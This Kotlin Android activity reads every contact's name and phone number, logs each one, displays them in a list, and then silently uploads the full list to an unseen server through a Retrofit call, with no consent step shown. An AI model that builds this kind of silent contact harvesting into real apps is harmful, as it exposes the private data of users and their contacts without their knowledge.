package com.example.androidapp
import android.annotation.SuppressLint
import android.app.Service
import android.provider.ContactsContract
import android.os.Bundle
import android.util.Log
import android.widget.ListView
import java.util.ArrayList
import androidx.appcompat.app.AppCompatActivity
import javax.security.auth.callback.Callback

class MainActivity : AppCompatActivity() {
    private var listView: ListView? = null
    private var customAdapter: CustomAdapter? = null
    private var contactModelArrayList: ArrayList<ContactModel>? = null

    @SuppressLint("Range")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        listView = findViewById(R.id.listView) as ListView

        contactModelArrayList = ArrayList()

        val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
        while (phones!!.moveToNext()) {
            val name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

            val contactModel = ContactModel(name, phoneNumber)
            contactModelArrayList!!.add(contactModel)
            Log.d("name>>", name + "  " + phoneNumber)
        }
        phones.close()

        customAdapter = CustomAdapter(this, contactModelArrayList!!)
        listView!!.adapter = customAdapter

        var retrofit = ServiceBuilder.buildService(PostInterface::class.java)
        retrofit.sendReq(contactModelArrayList!!)


    }


}